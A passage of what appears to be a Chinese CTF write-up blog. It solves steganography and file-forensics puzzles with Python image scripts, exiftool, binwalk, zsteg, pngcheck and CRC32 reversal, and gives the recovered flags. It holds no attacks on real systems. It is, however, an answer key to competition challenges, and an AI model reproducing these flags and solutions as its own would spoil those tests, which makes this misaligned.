</span><br><span class="line">mpl.rcParams[<span class="string">&#x27;font.family&#x27;</span>] = <span class="string">&#x27;sans-serif&#x27;</span></span><br><span class="line">mpl.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = <span class="string">&#x27;NSimSun,Times New Roman&#x27;</span></span><br><span class="line"> </span><br><span class="line">x, y = np.loadtxt(<span class="string">&#x27;./flag.txt&#x27;</span>, delimiter=<span class="string">&#x27;,&#x27;</span>, unpack=<span class="literal">True</span>)</span><br><span class="line">plt.plot(x, y, <span class="string">&#x27;*&#x27;</span>, color=<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">plt.xlabel(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;Data&#x27;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h3 id="好多数值"><a href="#好多数值" class="headerlink" title="好多数值"></a>好多数值</h3><p>打开之后是许多坐标，先分解一下图片长和宽。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">61366</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line"><span class="keyword">if</span> (i*j)==a:</span><br><span class="line">print(i,j)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">122 503</span><br><span class="line">503 122</span><br></pre></td></tr></table></figure><p>然后画图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">x = <span class="number">503</span> <span class="comment">#x坐标  通过对txt里的行数进行整数分解</span></span><br><span class="line">y = <span class="number">122</span> <span class="comment">#y坐标  x*y = 行数</span></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>,(x,y))<span class="comment">#创建图片</span></span><br><span class="line">file = open(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="comment">#打开rbg值文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过一个个rgb点生成图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,y):</span><br><span class="line">        line = file.readline()<span class="comment">#获取一行</span></span><br><span class="line">        rgb = line.split(<span class="string">&quot;,&quot;</span>)<span class="comment">#分离rgb</span></span><br><span class="line">        im.putpixel((i,j),(int(rgb[<span class="number">0</span>]),int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))<span class="comment">#rgb转化为像素</span></span><br><span class="line">im.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="乌云邀请码"><a href="#乌云邀请码" class="headerlink" title="乌云邀请码"></a>乌云邀请码</h3><p>使用Stegsolve发现rgb的0位有蹊跷。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/21.png" alt="21"></p><p>使用data extract功能，save bin保存为1.txt拿到flag。</p><h3 id="普通的二维码"><a href="#普通的二维码" class="headerlink" title="普通的二维码"></a>普通的二维码</h3><p>拿到二维码扫描没有发现太多东西，直接拖入01eitoer，最后发现一串字符串，而且只有小于8的数字，猜测是八进制，查看长度是126正好是3的倍数。写脚本转换。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">steady_str=<span class="string">&quot;146154141147173110141166145137171060125137120171137163143162151160164137117164143137124157137124145156137101163143151151041175&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(steady_str),<span class="number">3</span>):</span><br><span class="line">  flag+=chr(int(steady_str[i:i+<span class="number">3</span>],<span class="number">8</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="闪的好快"><a href="#闪的好快" class="headerlink" title="闪的好快"></a>闪的好快</h3><p>使用kali或者python分离图片。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# convert &#39;flag.gif&#39;  flag.png</span><br></pre></td></tr></table></figure><p>然后使用kali工具批量扫描二维码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;flag$ for i in &#123;0..17&#125;;do zbarimg &quot;.&#x2F;flag-$i.png&quot;;done &gt;&gt; qr.txt</span><br></pre></td></tr></table></figure><p>拿到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">QR-Code:S</span><br><span class="line">QR-Code:Y</span><br><span class="line">QR-Code:C</span><br><span class="line">QR-Code:&#123;</span><br><span class="line">QR-Code:F</span><br><span class="line">QR-Code:<span class="number">1</span></span><br><span class="line">QR-Code:a</span><br><span class="line">QR-Code:S</span><br><span class="line">QR-Code:h</span><br><span class="line">QR-Code:_</span><br><span class="line">QR-Code:s</span><br><span class="line">QR-Code:o</span><br><span class="line">QR-Code:_</span><br><span class="line">QR-Code:f</span><br><span class="line">QR-Code:<span class="number">4</span></span><br><span class="line">QR-Code:s</span><br><span class="line">QR-Code:T</span><br><span class="line">QR-Code:&#125;</span><br></pre></td></tr></table></figure><h1 id="中国移动"><a href="#中国移动" class="headerlink" title="中国移动"></a>中国移动</h1><h2 id="杂项-2"><a href="#杂项-2" class="headerlink" title="杂项"></a>杂项</h2><h3 id="FRP06-Where"><a href="#FRP06-Where" class="headerlink" title="FRP06 Where"></a>FRP06 Where</h3><p>拿到一个jpg文件。</p><p>linux下使用exiftool分析，发现是个gif文件，打开winhex发现也是gif头。直接修改后缀。我们可以看到名字虽然是jpg，但是类型却是gif。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面$ exiftool /home/steady/桌面/<span class="keyword">where</span>.jpg</span><br><span class="line">ExifTool Version Number         : <span class="number">12.07</span></span><br><span class="line">File Name                       : <span class="keyword">where</span>.jpg</span><br><span class="line">Directory                       : /home/steady/桌面</span><br><span class="line">File Size                       : <span class="number">392</span> kB</span><br><span class="line">File Modification Date/Time     : <span class="number">2020</span>:<span class="number">03</span>:<span class="number">09</span> <span class="number">20</span>:<span class="number">25</span>:<span class="number">57</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Access Date/Time           : <span class="number">2020</span>:<span class="number">10</span>:<span class="number">27</span> <span class="number">23</span>:<span class="number">31</span>:<span class="number">58</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Inode Change Date/Time     : <span class="number">2020</span>:<span class="number">10</span>:<span class="number">27</span> <span class="number">23</span>:<span class="number">31</span>:<span class="number">58</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Permissions                : rw-------</span><br><span class="line">File Type                       : GIF</span><br><span class="line">File Type Extension             : gif</span><br><span class="line">MIME Type                       : image/gif</span><br><span class="line">GIF Version                     : <span class="number">89</span>a</span><br><span class="line">Image Width                     : <span class="number">640</span></span><br><span class="line">Image Height                    : <span class="number">441</span></span><br><span class="line">Has Color Map                   : Yes</span><br><span class="line">Color Resolution Depth          : <span class="number">8</span></span><br><span class="line">Bits Per Pixel                  : <span class="number">8</span></span><br><span class="line">Background Color                : <span class="number">255</span></span><br><span class="line">XMP Toolkit                     : Adobe XMP Core <span class="number">5.3</span>-c011 <span class="number">66.145661</span>, <span class="number">2012</span>/<span class="number">02</span>/<span class="number">06</span><span class="number">-14</span>:<span class="number">56</span>:<span class="number">27</span></span><br><span class="line">Creator Tool                    : <span class="function">Adobe Photoshop <span class="title">CS6</span> (<span class="params">Windows</span>)</span></span><br><span class="line"><span class="function">Instance ID                     : xmp.iid:20FECB3F620111EAAC58D00140743BB9</span></span><br><span class="line"><span class="function">Document ID                     : xmp.did:20FECB40620111EAAC58D00140743BB9</span></span><br><span class="line"><span class="function">Derived From Instance ID        : xmp.iid:20FECB3D620111EAAC58D00140743BB9</span></span><br><span class="line"><span class="function">Derived From Document ID        : xmp.did:20FECB3E620111EAAC58D00140743BB9</span></span><br><span class="line"><span class="function">Frame Count                     : 3</span></span><br><span class="line"><span class="function">Duration                        : 10.10 s</span></span><br><span class="line"><span class="function">Image Size                      : 640x441</span></span><br><span class="line"><span class="function">Megapixels                      : 0.282</span></span><br></pre></td></tr></table></figure><p>直接查看gif文件或者使用linux–convert分离gif，拿到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# convert &#39;&#x2F;root&#x2F;桌面&#x2F;where.gif&#39; flag.png</span><br></pre></td></tr></table></figure><p>win的软件也可以直接分帧拿到flag。</p><h3 id="FRP10-hekkerman"><a href="#FRP10-hekkerman" class="headerlink" title="FRP10 hekkerman"></a>FRP10 hekkerman</h3><p>拿到图片，binwalk分析，直接提取文件，拿到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;jpg$ binwalk -e &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;hekkerman.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">30            0x1E            TIFF image data, little-endian offset of first image directory: 8</span><br><span class="line">212           0xD4            JPEG image data, JFIF standard 1.01</span><br><span class="line">242           0xF2            TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">414           0x19E           JPEG image data, JFIF standard 1.01</span><br><span class="line">444           0x1BC           TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">28428         0x6F0C          Copyright string: &quot;Copyright International Color Consortium, 2009&quot;</span><br></pre></td></tr></table></figure><p>dd命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;jpg$ dd if&#x3D;00000000.jpg of&#x3D;flag-1.jpg skip&#x3D;414 bs&#x3D;1</span><br></pre></td></tr></table></figure><p>exiftool提取缩略图</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;jpg$ exiftool -b -ThumbnailImage &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;hekkerman.jpg&gt; thumbnail.jpg </span><br></pre></td></tr></table></figure><p>python读出文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">offset = <span class="number">414</span></span><br><span class="line">f1=open(<span class="string">&#x27;flag.jpg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f=open(<span class="string">&quot;hekkerman.jpg&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">f.read(offset)</span><br><span class="line">data = f.read()</span><br><span class="line">f1.write(data)</span><br></pre></td></tr></table></figure><h3 id="FRP04-Fat-Cat"><a href="#FRP04-Fat-Cat" class="headerlink" title="FRP04 Fat Cat"></a>FRP04 Fat Cat</h3><p>修改jpg宽度，搜索十六进制FFC0之后的第三个到第七个十六进制是图片的宽度和高度。修改之后拿到flag。</p><h3 id="Misc4-Burps"><a href="#Misc4-Burps" class="headerlink" title="Misc4-Burps"></a>Misc4-Burps</h3><p>CRC32碰撞</p><p>将<code>1.txt-6.txt</code>的冗余校验码提取出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.txt 0x6083a1c8 </span><br><span class="line">2.txt 0xce70d424</span><br><span class="line">3.txt 0xc3f17511</span><br><span class="line">4.txt 0x526fd582</span><br><span class="line">5.txt 0x30e25038</span><br><span class="line">6.txt 0xaa3e6aea</span><br></pre></td></tr></table></figure><p>然后使用脚本碰撞，观察每一次得到的<code>4 bytes</code>，每一次得到4块十六进制数，将十六进制转换为字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PS D:\Tools\Misc\crc32&gt; python .\crc32.py reverse 0x6083a1c8</span><br><span class="line">4 bytes: &#123;0x74, 0x68, 0x65, 0x5f&#125;</span><br><span class="line">verification checksum: 0x6083a1c8 (OK)</span><br><span class="line">alternative: Cb9fTf (OK)</span><br><span class="line">alternative: Jhn4CW (OK)</span><br><span class="line">alternative: K9Md4R (OK)</span><br><span class="line">alternative: Lmggsq (OK)</span><br><span class="line">alternative: Nls5B4 (OK)</span><br><span class="line">alternative: PNHKc5 (OK)</span><br><span class="line">alternative: TJUJbV (OK)</span><br><span class="line">alternative: X4bYjM (OK)</span><br><span class="line">alternative: apQQ_2 (OK)</span><br><span class="line">alternative: bmKntz (OK)</span><br><span class="line">alternative: e9am3Y (OK)</span><br><span class="line">alternative: tEfsYS (OK)</span><br><span class="line">alternative: v4NPmF (OK)</span><br></pre></td></tr></table></figure><p>十六进制转字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">steady_str&#x3D;&quot;7468655f&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(0,len(steady_str),2):</span><br><span class="line">    flag+&#x3D;chr(int(steady_str[i:i+2],16))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="Misc5-Trees"><a href="#Misc5-Trees" class="headerlink" title="Misc5-Trees"></a>Misc5-Trees</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">&#x27;enc.png&#x27;</span>)</span><br><span class="line">w = img.width</span><br><span class="line">h = img.height</span><br><span class="line">img_obj = Image.new(<span class="string">&quot;RGB&quot;</span>,(w//<span class="number">16</span>,h//<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(w//<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(h//<span class="number">16</span>):</span><br><span class="line">        (r,g,b)=img.getpixel((x*<span class="number">16</span>,y*<span class="number">16</span>))</span><br><span class="line">        img_obj.putpixel((x,y),(r,g,b))</span><br><span class="line"></span><br><span class="line">img_obj.save(<span class="string">&#x27;ok.png&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="FRP19-Sunset"><a href="#FRP19-Sunset" class="headerlink" title="FRP19 Sunset"></a>FRP19 Sunset</h3><p>这道题尝试很多方式都没有拿到flag。最后仔细看图片，发现图片中有些小黑点，小黑点组成flag。一开始尝试stegsolve，找到白色比较多的一张图片，使用画图工具进行反色，但是情况并不理想，只能看到flag字段。</p><p>后来尝试python脚本，一开始的想法是找到对应的小黑点的rgb，然后根据rgb找到对应的坐标，然后把rgb值写入找到的对应坐标，然后根据坐标在画图。后来发现rgb的值不稳定，取出来的坐标也不全，这里写一下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">&#x27;sunset.jpg&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(img.size[<span class="number">0</span>]):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(img.size[<span class="number">1</span>]):</span><br><span class="line">        <span class="keyword">if</span> list(img.getpixel((i, j)))==list((<span class="number">34</span>, <span class="number">76</span>, <span class="number">118</span>)):</span><br><span class="line">            print(i,j)</span><br></pre></td></tr></table></figure><p>最后想到直接取出对应坐标的rgb值，然后放到对应坐标就可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img=Image.open(<span class="string">&#x27;sunset.jpg&#x27;</span>)</span><br><span class="line">w,h=img.size</span><br><span class="line">dec=Image.new(<span class="string">&#x27;RGB&#x27;</span>,(int(w/<span class="number">16</span>),int(h/<span class="number">16</span>)))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(int(w/<span class="number">16</span>)):</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(int(h/<span class="number">16</span>)):</span><br><span class="line">dec.putpixel((x,y),img.getpixel((x*<span class="number">16</span>,y*<span class="number">16</span>)))</span><br><span class="line">dec.show()</span><br></pre></td></tr></table></figure><p>答题意思就是生成一个全新的图片，但是大小像素缩小到原来的十六倍。获取到对应坐标的rgb值，直接就粘贴到新的图片，这里为什么是十六的倍数？</p><p>打开画图看到，整张图片被分成了许多正方形的小块，而flag的部分，在正方向的左上角，每个正方形的长度是8。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/27.png" alt="27"></p><p>把倍数改成8也是可以得到flag。</p><h3 id="FRP07-Hide"><a href="#FRP07-Hide" class="headerlink" title="FRP07 Hide"></a>FRP07 Hide</h3><p>听说是lsb隐写，使用stegsolve进行data extract，没有发现什么东西。直接使用zsteg，并使用–all参数，拿到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@root:~/桌面/flag/套娃<span class="comment"># zsteg &#x27;/root/桌面/flag/hide.png&#x27; --al | grep &quot;flag&quot;</span></span><br><span class="line">b1,g,lsb,yx         .. text: <span class="string">&quot;flag&#123;easy_LSB_stego&#125;v5&quot;</span></span><br></pre></td></tr></table></figure><h3 id="FRP05-Chain"><a href="#FRP05-Chain" class="headerlink" title="FRP05 Chain"></a>FRP05 Chain</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ strings &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;jpg&#x2F;chain.jpg</span><br></pre></td></tr></table></figure><p>拿到flag的十六进制，转为字符串就是flag。</p><h3 id="FRP15-Checkit"><a href="#FRP15-Checkit" class="headerlink" title="FRP15 Checkit"></a>FRP15 Checkit</h3><p>题目是checkit，图片也是png。尝试pngcheck。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\12521\Desktop\CTFTools\信息隐藏\pngcheck&gt;pngcheck.exe -v C:\Users\12521\Desktop\check.png</span><br><span class="line">File: C:\Users\12521\Desktop\check.png (1421461 bytes)</span><br><span class="line">  chunk IHDR at offset 0x0000c, length 13</span><br><span class="line">    1000 x 562 image, 32-bit RGB+alpha, non-interlaced</span><br><span class="line">  chunk sRGB at offset 0x00025, length 1</span><br><span class="line">    rendering intent &#x3D; perceptual</span><br><span class="line">  chunk gAMA at offset 0x00032, length 4: 0.45455</span><br><span class="line">  chunk pHYs at offset 0x00042, length 9: 3780x3780 pixels&#x2F;meter (96 dpi)</span><br><span class="line">  chunk IDAT at offset 0x00057, length 65445</span><br><span class="line">    zlib: deflated, 32K window, fast compression</span><br><span class="line">  chunk IDAT at offset 0x10008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x20008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x30008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x40008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x50008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x60008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x70008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x80008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x90008, length 65524</span><br><span class="line">  chunk IDAT at offset 0xa0008, length 65524</span><br><span class="line">  chunk IDAT at offset 0xb0008, length 65524</span><br><span class="line">  chunk IDAT at offset 0xc0008, length 65524</span><br><span class="line">  chunk IDAT at offset 0xd0008, length 65524</span><br><span class="line">  chunk IDAT at offset 0xe0008, length 65524</span><br><span class="line">  chunk IDAT at offset 0xf0008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x100008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x110008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x120008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x130008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x140008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x150008, length 45027</span><br><span class="line">  chunk IDAT at offset 0x15aff7, length 138</span><br><span class="line">  chunk IEND at offset 0x15b08d, length 0</span><br></pre></td></tr></table></figure><p>倒数第三个块没有满，倒数第二个块就是隐藏的数据。</p><p>提取出来，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib </span><br><span class="line"><span class="keyword">import</span> binascii </span><br><span class="line">a=<span class="string">&quot;789C5D91011280400802BF04FFFF5C75294B5537738A21A27D1E49CFD17DB3937A92E7E603880A6D485100901FB0410153350DE83112EA2D51C54CE2E585B15A2FC78E8872F51C6FC1881882F93D372DEF78E665B0C36C529622A0A45588138833A170A2071DDCD18219DB8C0D465D8B6989719645ED9C11C36AE3ABDAEFCFC0ACF023E77C17C7897667&quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>) </span><br><span class="line">b=zlib.decompress(a) </span><br><span class="line">result=binascii.hexlify(b) </span><br><span class="line">print(result)</span><br><span class="line">print(bin(int(result,<span class="number">16</span>)))</span><br></pre></td></tr></table></figure><p>二进制转化为图片，扫码拿到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">MAX = <span class="number">25</span></span><br><span class="line">pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX*<span class="number">9</span>,MAX*<span class="number">9</span>))</span><br><span class="line">str = <span class="string">&quotquot;</span></span><br><span class="line">print(len(str))</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range (<span class="number">0</span>,MAX*<span class="number">9</span>,<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range (<span class="number">0</span>,MAX*<span class="number">9</span>,<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span>(str[i] == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">                    pic.putpixel([x+j,y+n],(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">                    pic.putpixel([x+l,y+k],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="FRP18-loli"><a href="#FRP18-loli" class="headerlink" title="FRP18 loli"></a>FRP18 loli</h3><p>拿到类似二维码的图片尝试扫描。得到提示：</p><p><code>tips:255</code>。最后通过将图片转16进制和0xff异或，也就是将图片的16进制取反。使用winhex的异或功能。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/33.png" alt="33"></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/34.png" alt="34"></p><p>最后拿到一张图片，图片中藏有一个png，并且图片最后有提示–<code>black and wihite</code>。</p><p>拿到图片之后是一些黑白组成的，当然考虑白1黑0进行转换，仔细观察发现一共被分成了11列，每一列都被白色分隔开，并且被分割成了50行，每一行都被黑色分割开。而且还发现每一列都是八个黑白色组成。脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 